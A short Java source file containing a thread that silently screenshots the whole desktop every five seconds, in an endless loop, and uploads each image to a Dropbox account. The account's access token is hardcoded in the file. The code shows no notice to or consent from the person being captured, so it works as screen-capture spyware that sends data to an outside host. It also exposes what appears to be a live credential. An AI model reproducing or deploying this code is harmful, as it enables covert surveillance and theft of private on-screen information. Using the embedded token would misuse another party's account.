import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.io.FileInputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread{
    InputStream in;

    String ACCESS_TOKEN = "hYIIfCqN0wAAAAAAAAAAVDGqkYBCbGo_3HWzC-6_wAKljJ6uhhk_ZdZkzrD3IDsk";
    DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
    DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
    int counter = 0;

    public void run() {
        while(true) {

            //Data
            Date date = new Date();
            SimpleDateFormat form = new SimpleDateFormat("yyyyMMdd_HHmmss");
            String Date = form.format(date);
            System.out.println(Date);

            //Screenshot

            try {

                Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                BufferedImage capture = new Robot().createScreenCapture(screen);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(capture, "png", baos);
                in = new ByteArrayInputStream(baos.toByteArray());
            } catch (IOException | AWTException e) {
                e.printStackTrace();
            }

            try  {
                sleep(5000);
                client.files().uploadBuilder("/" + Date + ".png")
                        .uploadAndFinish(in);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (UploadErrorException e) {
                e.printStackTrace();
            } catch (DbxException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            System.out.println(counter++);
        }
    }
}
